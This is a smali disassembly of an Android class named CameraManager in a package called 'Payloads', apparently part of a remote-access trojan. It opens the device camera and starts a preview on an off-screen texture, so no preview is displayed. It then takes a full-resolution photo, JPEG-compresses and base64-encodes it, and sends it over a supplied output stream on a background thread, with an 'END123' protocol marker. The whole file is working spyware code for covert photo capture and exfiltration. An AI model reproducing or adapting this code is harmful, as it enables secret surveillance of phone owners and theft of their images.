.class public Lcom/android/ld/Payloads/CameraManager;
.super Ljava/lang/Object;
.source "CameraManager.java"


# static fields
.field static TAG:Ljava/lang/String;


# instance fields
.field private camera:Landroid/hardware/Camera;

.field private context:Landroid/content/Context;

.field private out:Ljava/io/OutputStream;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 28
    const-string v0, "cameraPreviewClass"

    sput-object v0, Lcom/android/ld/Payloads/CameraManager;->TAG:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>(Landroid/content/Context;)V
    .locals 1
    .param p1, "context"    # Landroid/content/Context;

    .line 30
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 32
    :try_start_0
    iput-object p1, p0, Lcom/android/ld/Payloads/CameraManager;->context:Landroid/content/Context;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 35
    goto :goto_0

    .line 33
    :catch_0
    move-exception v0

    .line 34
    .local v0, "e":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    .line 36
    .end local v0    # "e":Ljava/lang/Exception;
    :goto_0
    return-void
.end method

.method static synthetic access$000(Lcom/android/ld/Payloads/CameraManager;)V
    .locals 0
    .param p0, "x0"    # Lcom/android/ld/Payloads/CameraManager;

    .line 24
    invoke-direct {p0}, Lcom/android/ld/Payloads/CameraManager;->releaseCamera()V

    return-void
.end method

.method static synthetic access$100(Lcom/android/ld/Payloads/CameraManager;[B)V
    .locals 0
    .param p0, "x0"    # Lcom/android/ld/Payloads/CameraManager;
    .param p1, "x1"    # [B

    .line 24
    invoke-direct {p0, p1}, Lcom/android/ld/Payloads/CameraManager;->sendPhoto([B)V

    return-void
.end method

.method static synthetic access$200(Lcom/android/ld/Payloads/CameraManager;)Ljava/io/OutputStream;
    .locals 1
    .param p0, "x0"    # Lcom/android/ld/Payloads/CameraManager;

    .line 24
    iget-object v0, p0, Lcom/android/ld/Payloads/CameraManager;->out:Ljava/io/OutputStream;

    return-object v0
.end method

.method private releaseCamera()V
    .locals 1

    .line 99
    iget-object v0, p0, Lcom/android/ld/Payloads/CameraManager;->camera:Landroid/hardware/Camera;

    if-eqz v0, :cond_0

    .line 100
    invoke-virtual {v0}, Landroid/hardware/Camera;->stopPreview()V

    .line 101
    iget-object v0, p0, Lcom/android/ld/Payloads/CameraManager;->camera:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->release()V

    .line 102
    const/4 v0, 0x0

    iput-object v0, p0, Lcom/android/ld/Payloads/CameraManager;->camera:Landroid/hardware/Camera;

    .line 104
    :cond_0
    return-void
.end method

.method private sendPhoto([B)V
    .locals 6
    .param p1, "data"    # [B

    .line 77
    new-instance v0, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v0}, Ljava/io/ByteArrayOutputStream;-><init>()V

    .line 78
    .local v0, "bos":Ljava/io/ByteArrayOutputStream;
    array-length v1, p1

    const/4 v2, 0x0

    invoke-static {p1, v2, v1}, Landroid/graphics/BitmapFactory;->decodeByteArray([BII)Landroid/graphics/Bitmap;

    move-result-object v1

    .line 79
    .local v1, "bitmap":Landroid/graphics/Bitmap;
    sget-object v3, Landroid/graphics/Bitmap$CompressFormat;->JPEG:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v4, 0x50

    invoke-virtual {v1, v3, v4, v0}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    .line 81
    invoke-virtual {v0}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v3

    .line 82
    .local v3, "byteArr":[B
    invoke-static {v3, v2}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v2

    .line 83
    .local v2, "encodedImage":Ljava/lang/String;
    new-instance v4, Ljava/lang/Thread;

    new-instance v5, Lcom/android/ld/Payloads/CameraManager$2;

    invoke-direct {v5, p0, v2}, Lcom/android/ld/Payloads/CameraManager$2;-><init>(Lcom/android/ld/Payloads/CameraManager;Ljava/lang/String;)V

    invoke-direct {v4, v5}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 95
    .local v4, "thread":Ljava/lang/Thread;
    invoke-virtual {v4}, Ljava/lang/Thread;->start()V

    .line 96
    return-void
.end method


# virtual methods
.method public startUp(ILjava/io/OutputStream;)V
    .locals 7
    .param p1, "cameraID"    # I
    .param p2, "outputStream"    # Ljava/io/OutputStream;

    .line 40
    iput-object p2, p0, Lcom/android/ld/Payloads/CameraManager;->out:Ljava/io/OutputStream;

    .line 42
    :try_start_0
    invoke-static {p1}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    move-result-object v0

    iput-object v0, p0, Lcom/android/ld/Payloads/CameraManager;->camera:Landroid/hardware/Camera;
    :try_end_0
    .catch Ljava/lang/RuntimeException; {:try_start_0 .. :try_end_0} :catch_0

    .line 50
    goto :goto_0

    .line 43
    :catch_0
    move-exception v0

    .line 44
    .local v0, "e":Ljava/lang/RuntimeException;
    invoke-virtual {v0}, Ljava/lang/RuntimeException;->printStackTrace()V

    .line 46
    :try_start_1
    iget-object v1, p0, Lcom/android/ld/Payloads/CameraManager;->out:Ljava/io/OutputStream;

    const-string v2, "END123\n"

    sget-object v3, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v2, v3}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/io/OutputStream;->write([B)V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    .line 49
    goto :goto_0

    .line 47
    :catch_1
    move-exception v1

    .line 48
    .local v1, "ex":Ljava/io/IOException;
    invoke-virtual {v1}, Ljava/io/IOException;->printStackTrace()V

    .line 51
    .end local v0    # "e":Ljava/lang/RuntimeException;
    .end local v1    # "ex":Ljava/io/IOException;
    :goto_0
    iget-object v0, p0, Lcom/android/ld/Payloads/CameraManager;->camera:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v0

    .line 52
    .local v0, "parameters":Landroid/hardware/Camera$Parameters;
    invoke-virtual {v0}, Landroid/hardware/Camera$Parameters;->getSupportedPictureSizes()Ljava/util/List;

    move-result-object v1

    .line 53
    .local v1, "allSizes":Ljava/util/List;, "Ljava/util/List<Landroid/hardware/Camera$Size;>;"
    const/4 v2, 0x0

    invoke-interface {v1, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/hardware/Camera$Size;

    .line 54
    .local v3, "size":Landroid/hardware/Camera$Size;
    const/4 v4, 0x0

    .local v4, "i":I
    :goto_1
    invoke-interface {v1}, Ljava/util/List;->size()I

    move-result v5

    if-ge v4, v5, :cond_1

    .line 55
    invoke-interface {v1, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/hardware/Camera$Size;

    iget v5, v5, Landroid/hardware/Camera$Size;->width:I

    iget v6, v3, Landroid/hardware/Camera$Size;->width:I

    if-le v5, v6, :cond_0

    .line 56
    invoke-interface {v1, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v5

    move-object v3, v5

    check-cast v3, Landroid/hardware/Camera$Size;

    .line 54
    :cond_0
    add-int/lit8 v4, v4, 0x1

    goto :goto_1

    .line 59
    .end local v4    # "i":I
    :cond_1
    iget v4, v3, Landroid/hardware/Camera$Size;->width:I

    iget v5, v3, Landroid/hardware/Camera$Size;->height:I

    invoke-virtual {v0, v4, v5}, Landroid/hardware/Camera$Parameters;->setPictureSize(II)V

    .line 60
    iget-object v4, p0, Lcom/android/ld/Payloads/CameraManager;->camera:Landroid/hardware/Camera;

    invoke-virtual {v4, v0}, Landroid/hardware/Camera;->setParameters(Landroid/hardware/Camera$Parameters;)V

    .line 62
    :try_start_2
    iget-object v4, p0, Lcom/android/ld/Payloads/CameraManager;->camera:Landroid/hardware/Camera;

    new-instance v5, Landroid/graphics/SurfaceTexture;

    invoke-direct {v5, v2}, Landroid/graphics/SurfaceTexture;-><init>(I)V

    invoke-virtual {v4, v5}, Landroid/hardware/Camera;->setPreviewTexture(Landroid/graphics/SurfaceTexture;)V

    .line 63
    iget-object v2, p0, Lcom/android/ld/Payloads/CameraManager;->camera:Landroid/hardware/Camera;

    invoke-virtual {v2}, Landroid/hardware/Camera;->startPreview()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    .line 66
    goto :goto_2

    .line 64
    :catch_2
    move-exception v2

    .line 65
    .local v2, "e":Ljava/lang/Exception;
    invoke-virtual {v2}, Ljava/lang/Exception;->printStackTrace()V

    .line 67
    .end local v2    # "e":Ljava/lang/Exception;
    :goto_2
    iget-object v2, p0, Lcom/android/ld/Payloads/CameraManager;->camera:Landroid/hardware/Camera;

    new-instance v4, Lcom/android/ld/Payloads/CameraManager$1;

    invoke-direct {v4, p0}, Lcom/android/ld/Payloads/CameraManager$1;-><init>(Lcom/android/ld/Payloads/CameraManager;)V

    const/4 v5, 0x0

    invoke-virtual {v2, v5, v5, v4}, Landroid/hardware/Camera;->takePicture(Landroid/hardware/Camera$ShutterCallback;Landroid/hardware/Camera$PictureCallback;Landroid/hardware/Camera$PictureCallback;)V

    .line 74
    return-void
.end method
